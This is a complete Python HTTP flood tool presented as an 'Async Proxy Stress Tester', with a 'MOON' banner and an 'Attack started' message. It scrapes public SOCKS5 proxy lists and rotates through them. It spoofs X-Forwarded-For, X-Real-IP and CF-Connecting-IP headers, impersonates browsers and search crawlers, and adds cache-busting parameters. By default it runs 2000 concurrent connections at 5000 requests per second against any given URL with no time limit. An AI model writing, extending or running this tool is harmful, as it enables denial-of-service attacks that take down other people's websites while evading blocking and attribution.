#⠀⠀⠀⠀⢀⠠⠤⠀⢀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠐⠀⠐⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⠀⢀⣼⡇⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⠀⠀⠀⠀⣴⣿⣿⠇⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣇⠀⠀⢀⣾⣿⣿⣿⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠐⠀⡀
#⠀⠀⠀⠀⢰⡿⠉⠀⡜⣿⣿⣿⡿⠿⢿⣿⣿⡃⠀⠀⠂⠄⠀
#⠀⠀⠒⠒⠸⣿⣄⡘⣃⣿⣿⡟⢰⠃⠀⢹⣿⡇⠀⠀⠀⠀⠀
#⠀⠀⠚⠉⠀⠊⠻⣿⣿⣿⣿⣿⣮⣤⣤⣿⡟⠁⠘⠠⠁⠀⠀
#⠀⠀⠀⠀⠀⠠⠀⠀⠈⠙⠛⠛⠛⠛⠛⠁⠀⠒⠤⠀⠀⠀⠀
#⠨⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠀⠀⠀⠀⠀
#⠁⠃⠉⠀⠀⠀⠀⠀⠀⠀

#!/usr/bin/env python3

import asyncio
import aiohttp
import random
import time
import sys
import json
import signal
import argparse
import urllib.request
import socket
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class Proxy:
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None
    
    @property
    def url(self) -> str:
        if self.username and self.password:
            return f"socks5://{self.username}:{self.password}@{self.host}:{self.port}"
        return f"socks5://{self.host}:{self.port}"

class ProxyManager:
    @staticmethod
    def fetch_proxies_online():
        proxy_sources = [
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
        ]
        
        all_proxies = set()
        
        for source in proxy_sources:
            try:
                req = urllib.request.Request(
                    source, 
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                )
                with urllib.request.urlopen(req, timeout=15) as response:
                    content = response.read().decode('utf-8', errors='ignore')
                    for line in content.split('\n'):
                        line = line.strip()
                        if ':' in line:
                            parts = line.split(':')
                            if len(parts) >= 2:
                                ip = parts[0].strip()
                                if (ip.count('.') == 3 and 
                                    all(0 <= int(part) <= 255 for part in ip.split('.') if part.isdigit())):
                                    all_proxies.add(line)
                print(f"[PROXY] Fetched from {source.split('/')[-1]}")
                time.sleep(1)
            except Exception as e:
                print(f"[PROXY] Failed {source}: {str(e)[:50]}")
                continue
        
        return list(all_proxies)[:800]
    
    @staticmethod
    def test_proxy_sync(proxy_str: str) -> Optional[Proxy]:
        try:
            parts = proxy_str.split(':')
            if len(parts) < 2:
                return None
            
            host = parts[0].strip()
            
            try:
                port = int(parts[1].strip())
            except ValueError:
                port = 1080
            
            username = None
            password = None
            if len(parts) >= 4:
                username = parts[2].strip()
                password = parts[3].strip()
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                return Proxy(host, port, username, password)
        except Exception:
            pass
        return None
    
    @staticmethod
    def test_proxies_batch(proxy_strings: List[str], max_workers: int = 50) -> List[Proxy]:
        valid_proxies = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_proxy = {
                executor.submit(ProxyManager.test_proxy_sync, proxy_str): proxy_str 
                for proxy_str in proxy_strings
            }
            
            completed = 0
            for future in as_completed(future_to_proxy):
                completed += 1
                if completed % 50 == 0:
                    print(f"[PROXY] Tested {completed}/{len(proxy_strings)} proxies...")
                
                result = future.result()
                if result:
                    valid_proxies.append(result)
        
        return valid_proxies

class StressTester:
    def __init__(self, target_url: str, max_concurrent: int = 2000, 
                 requests_per_second: int = 5000, duration: int = 0,
                 proxy_file: str = "proxies.txt", auto_fetch: bool = False):
        self.target_url = target_url
        self.max_concurrent = max_concurrent
        self.rps = requests_per_second
        self.duration = duration
        self.proxy_file = proxy_file
        self.auto_fetch = auto_fetch
        
        self.proxies: List[Proxy] = []
        self.session: Optional[aiohttp.ClientSession] = None
        self.semaphore: Optional[asyncio.Semaphore] = None
        self.is_running = True
        
        self.stats = {
            "total": 0,
            "success": 0,
            "failed": 0,
            "start_time": 0,
            "proxy_stats": {}
        }
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 14; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0",
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
            "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)",
            "Mozilla/5.0 (compatible; Applebot/0.3; +http://www.apple.com/go/applebot)",
        ]
        
        self.headers_templates = [
            {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
            {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
            {"Accept-Language": "en-US,en;q=0.9,es;q=0.8,fr;q=0.7,de;q=0.6,it;q=0.5,pt;q=0.4,ru;q=0.3"},
            {"Accept-Language": "en-GB,en;q=0.9,en-US;q=0.8"},
            {"Accept-Encoding": "gzip, deflate, br, zstd"},
            {"Accept-Encoding": "gzip, deflate"},
            {"DNT": "1"},
            {"Upgrade-Insecure-Requests": "1"},
            {"Sec-Fetch-Dest": "document"},
            {"Sec-Fetch-Dest": "empty"},
            {"Sec-Fetch-Mode": "navigate"},
            {"Sec-Fetch-Mode": "cors"},
            {"Sec-Fetch-Site": "cross-site"},
            {"Sec-Fetch-Site": "same-origin"},
            {"Sec-Fetch-User": "?1"},
            {"Sec-CH-UA": '"Chromium";v="131", "Not_A Brand";v="24"'},
            {"Sec-CH-UA": '"Google Chrome";v="131", "Not_A Brand";v="24", "Chromium";v="131"'},
            {"Sec-CH-UA-Mobile": "?0"},
            {"Sec-CH-UA-Mobile": "?1"},
            {"Sec-CH-UA-Platform": '"Windows"'},
            {"Sec-CH-UA-Platform": '"macOS"'},
            {"Sec-CH-UA-Platform": '"Linux"'},
            {"Sec-CH-UA-Platform": '"Android"'},
            {"Sec-CH-UA-Platform": '"iOS"'},
            {"Priority": "u=0, i"},
            {"Cache-Control": "no-cache, no-store, must-revalidate"},
            {"Cache-Control": "max-age=0"},
            {"Cache-Control": "private, max-age=0, no-cache"},
            {"Pragma": "no-cache"},
            {"TE": "trailers"},
            {"Connection": "keep-alive"},
            {"Connection": "close"},
            {"Referer": "https://www.google.com/"},
            {"Referer": "https://www.bing.com/"},
            {"Referer": "https://www.facebook.com/"},
            {"Origin": "https://www.google.com"},
            {"X-Requested-With": "XMLHttpRequest"},
        ]
        
        self.methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"]
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        self.is_running = False
    
    def display_banner(self):
        print(r"""
 ███▄ ▄███▓ ▒█████   ▒█████   ███▄    █ 
▓██▒▀█▀ ██▒▒██▒  ██▒▒██▒  ██▒ ██ ▀█   █ 
▓██    ▓██░▒██░  ██▒▒██░  ██▒▓██  ▀█ ██▒
▒██    ▒██ ▒██   ██░▒██   ██░▓██▒  ▐▌██▒
▒██▒   ░██▒░ ████▓▒░░ ████▓▒░▒██░   ▓██░
░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
░  ░      ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░░   ░ ▒░
░      ░   ░ ░ ░ ▒  ░ ░ ░ ▒     ░   ░ ░ 
       ░       ░ ░      ░ ░           ░ 
                                                             
        """)
    
    def fetch_and_test_proxies(self):
        print("[PROXY] Fetching proxies from online sources...")
        
        raw_proxies = ProxyManager.fetch_proxies_online()
        if not raw_proxies:
            print("[PROXY] No proxies found online")
            return []
        
        print(f"[PROXY] Found {len(raw_proxies)} raw proxies, testing...")
        
        valid_proxies = ProxyManager.test_proxies_batch(raw_proxies[:300], max_workers=40)
        
        print(f"[PROXY] Valid proxies: {len(valid_proxies)}")
        
        if valid_proxies:
            with open("proxies_fetched.txt", "w") as f:
                for proxy in valid_proxies:
                    if proxy.username and proxy.password:
                        f.write(f"{proxy.host}:{proxy.port}:{proxy.username}:{proxy.password}\n")
                    else:
                        f.write(f"{proxy.host}:{proxy.port}\n")
            print("[PROXY] Saved to proxies_fetched.txt")
        
        return valid_proxies
    
    def load_proxies(self):
        loaded_proxies = []
        
        if self.auto_fetch:
            fetched_proxies = self.fetch_and_test_proxies()
            if fetched_proxies:
                loaded_proxies.extend(fetched_proxies)
                print(f"[PROXY] Added {len(fetched_proxies)} fetched proxies")
        
        try:
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    parts = line.split(':')
                    if len(parts) >= 2:
                        host = parts[0].strip()
                        try:
                            port = int(parts[1].strip())
                        except ValueError:
                            continue
                        
                        username = parts[2].strip() if len(parts) > 2 else None
                        password = parts[3].strip() if len(parts) > 3 else None
                        
                        loaded_proxies.append(Proxy(host, port, username, password))
            
            print(f"[PROXY] Loaded {len(loaded_proxies)} proxies from file")
            
        except FileNotFoundError:
            print(f"[PROXY] File {self.proxy_file} not found")
        
        if not loaded_proxies and not self.auto_fetch:
            print("[ERROR] No proxies available")
            sys.exit(1)
        
        self.proxies = loaded_proxies[:1000]
        
        if len(self.proxies) < 10:
            print(f"[WARN] Only {len(self.proxies)} proxies available")
        else:
            print(f"[PROXY] Total proxies ready: {len(self.proxies)}")
    
    def get_random_headers(self):
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }
        
        num_extra = random.randint(4, 8)
        added_headers = set(['User-Agent', 'X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP'])
        
        attempts = 0
        while len(added_headers) < num_extra + 4 and attempts < 20:
            header = random.choice(self.headers_templates)
            for key in header:
                if key not in headers:
                    headers[key] = header[key]
                    added_headers.add(key)
                    break
            attempts += 1
        
        if random.random() > 0.7:
            headers["Referer"] = self.target_url
        
        return headers
    
    async def make_request(self, request_id: int):
        if not self.proxies or not self.semaphore:
            return
        
        async with self.semaphore:
            proxy = random.choice(self.proxies)
            
            try:
                headers = self.get_random_headers()
                method = random.choice(self.methods)
                
                params = {
                    "id": str(request_id),
                    "_": str(int(time.time() * 1000)),
                    "cache": str(random.randint(10000, 99999)),
                    "rand": str(random.randint(1000000, 9999999))
                }
                
                async with self.session.request(
                    method=method,
                    url=self.target_url,
                    params=params if method in ["GET", "HEAD", "OPTIONS"] else None,
                    headers=headers,
                    proxy=proxy.url,
                    timeout=aiohttp.ClientTimeout(total=8, connect=4),
                    ssl=False
                ) as response:
                    
                    self.stats["total"] += 1
                    
                    if 200 <= response.status < 500:
                        self.stats["success"] += 1
                        proxy_key = f"{proxy.host}:{proxy.port}"
                        self.stats["proxy_stats"][proxy_key] = self.stats["proxy_stats"].get(proxy_key, 0) + 1
                    else:
                        self.stats["failed"] += 1
                    
                    await response.read()
                    
            except asyncio.TimeoutError:
                self.stats["failed"] += 1
            except Exception as e:
                self.stats["failed"] += 1
    
    async def request_generator(self):
        request_id = 0
        
        while self.is_running:
            if self.duration > 0:
                elapsed = time.time() - self.stats["start_time"]
                if elapsed >= self.duration:
                    break
            
            request_id += 1
            
            if self.rps > 0:
                batch_size = min(10, self.rps // 100)
                target_interval = 1.0 / (self.rps / batch_size)
                
                for _ in range(batch_size):
                    asyncio.create_task(self.make_request(request_id))
                    request_id += 1
                
                await asyncio.sleep(target_interval)
            else:
                asyncio.create_task(self.make_request(request_id))
                await asyncio.sleep(0.001)
    
    async def monitor(self):
        last_count = 0
        last_time = time.time()
        
        while self.is_running:
            await asyncio.sleep(2)
            
            current_time = time.time()
            elapsed = current_time - self.stats["start_time"]
            current_total = self.stats["total"]
            
            interval = current_time - last_time
            interval_rps = (current_total - last_count) / interval if interval > 0 else 0
            total_rps = current_total / elapsed if elapsed > 0 else 0
            
            active_tasks = self.semaphore._value if self.semaphore else 0
            concurrent_active = self.max_concurrent - active_tasks
            
            print("\033[2J\033[H", end="")
            
            print("=" * 70)
            print("PROXY STRESS TESTER - LIVE DASHBOARD")
            print("=" * 70)
            print(f"Target     : {self.target_url}")
            print(f"Duration   : {int(elapsed)}s")
            print(f"Proxies    : {len(self.proxies)}")
            print(f"Concurrent : {concurrent_active}/{self.max_concurrent}")
            print("-" * 70)
            print(f"Requests   : {current_total:,}")
            print(f"Success    : {self.stats['success']:,}")
            print(f"Failed     : {self.stats['failed']:,}")
            success_rate = (self.stats['success']/current_total*100 if current_total>0 else 0)
            print(f"Success %  : {success_rate:.1f}%")
            print(f"RPS (now)  : {interval_rps:.0f}")
            print(f"RPS (avg)  : {total_rps:.0f}")
            print("=" * 70)
            print("Press Ctrl+C to stop")
            print("=" * 70)
            
            if self.stats["proxy_stats"]:
                top_proxies = sorted(
                    self.stats["proxy_stats"].items(),
                    key=lambda x: x[1],
                    reverse=True
                )[:3]
                
                print("\nTop 3 Proxies:")
                for proxy, count in top_proxies:
                    success_rate = count / current_total * 100 if current_total > 0 else 0
                    print(f"  {proxy:<25} : {count:<6} ({success_rate:.1f}%)")
            
            last_count = current_total
            last_time = current_time
    
    async def run(self):
        self.display_banner()
        
        print(f"[INFO] Target URL     : {self.target_url}")
        print(f"[INFO] Max concurrent : {self.max_concurrent}")
        print(f"[INFO] Target RPS     : {self.rps}")
        print(f"[INFO] Duration       : {self.duration if self.duration > 0 else 'unlimited'}s")
        print(f"[INFO] Auto-fetch     : {'Yes' if self.auto_fetch else 'No'}")
        print()
        
        self.load_proxies()
        
        if len(self.proxies) < 5:
            print("[ERROR] Not enough proxies to continue")
            sys.exit(1)
        elif len(self.proxies) < 20:
            print("[WARN] Low proxy count, effectiveness reduced")
            cont = input("Continue anyway? (y/N): ")
            if cont.lower() != 'y':
                return
        
        self.semaphore = asyncio.Semaphore(self.max_concurrent)
        
        connector = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            force_close=True,
            enable_cleanup_closed=True,
            use_dns_cache=True
        )
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            trust_env=False
        )
        
        self.stats["start_time"] = time.time()
        
        try:
            monitor_task = asyncio.create_task(self.monitor())
            
            worker_count = min(self.max_concurrent // 200, 10)
            if worker_count < 1:
                worker_count = 1
            
            worker_tasks = []
            for _ in range(worker_count):
                task = asyncio.create_task(self.request_generator())
                worker_tasks.append(task)
            
            print(f"[INFO] Started {worker_count} workers")
            print("[INFO] Attack started. Press Ctrl+C to stop.\n")
            
            if self.duration > 0:
                await asyncio.sleep(self.duration)
                print("\n[INFO] Duration completed")
            else:
                await asyncio.gather(*worker_tasks)
                
        except KeyboardInterrupt:
            print("\n[INFO] Stopped by user")
        finally:
            self.is_running = False
            
            if self.session and not self.session.closed:
                await self.session.close()
            
            for task in worker_tasks:
                if not task.done():
                    task.cancel()
            
            if not monitor_task.done():
                monitor_task.cancel()
            
            try:
                await asyncio.sleep(0.1)
            except:
                pass
            
            elapsed = time.time() - self.stats["start_time"]
            
            print("\n" + "=" * 70)
            print("FINAL STATISTICS")
            print("=" * 70)
            print(f"Total time      : {elapsed:.1f}s")
            print(f"Total requests  : {self.stats['total']:,}")
            print(f"Successful      : {self.stats['success']:,}")
            print(f"Failed          : {self.stats['failed']:,}")
            
            if elapsed > 0:
                avg_rps = self.stats['total'] / elapsed
                print(f"Avg RPS         : {avg_rps:.1f}")
            else:
                print(f"Avg RPS         : 0.0")
            
            print(f"Proxies used    : {len(self.stats['proxy_stats'])}")
            
            if self.stats['total'] > 0:
                success_rate = (self.stats['success'] / self.stats['total']) * 100
                print(f"Success rate    : {success_rate:.1f}%")
            else:
                print(f"Success rate    : 0.0%")
            
            print("=" * 70)
            
            results = {
                "target": self.target_url,
                "duration": elapsed,
                "total_requests": self.stats["total"],
                "successful": self.stats["success"],
                "failed": self.stats["failed"],
                "proxies_used": len(self.stats["proxy_stats"]),
                "timestamp": time.time()
            }
            
            if elapsed > 0:
                results["avg_rps"] = self.stats["total"] / elapsed
                results["success_rate"] = (self.stats["success"] / self.stats["total"] * 100) if self.stats["total"] > 0 else 0
            
            with open("stress_results.json", "w") as f:
                json.dump(results, f, indent=2)
            
            print("[INFO] Results saved to stress_results.json")

def main():
    parser = argparse.ArgumentParser(description="Async Proxy Stress Tester")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-c", "--concurrent", type=int, default=2000,
                       help="Maximum concurrent connections (default: 2000)")
    parser.add_argument("-r", "--rps", type=int, default=5000,
                       help="Target requests per second (default: 5000)")
    parser.add_argument("-d", "--duration", type=int, default=0,
                       help="Test duration in seconds (0 = unlimited)")
    parser.add_argument("-p", "--proxies", type=str, default="proxies.txt",
                       help="Proxy file (default: proxies.txt)")
    parser.add_argument("-f", "--fetch", action="store_true",
                       help="Auto-fetch proxies online")
    
    args = parser.parse_args()
    
    if not args.url.startswith(("http://", "https://")):
        print("[ERROR] URL must start with http:// or https://")
        sys.exit(1)
    
    tester = StressTester(
        target_url=args.url,
        max_concurrent=args.concurrent,
        requests_per_second=args.rps,
        duration=args.duration,
        proxy_file=args.proxies,
        auto_fetch=args.fetch
    )
    
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
        print("[INFO] Increased file descriptor limit")
    except Exception as e:
        print(f"[WARN] Could not increase file limit: {e}")
    
    asyncio.run(tester.run())

if __name__ == "__main__":
    main()
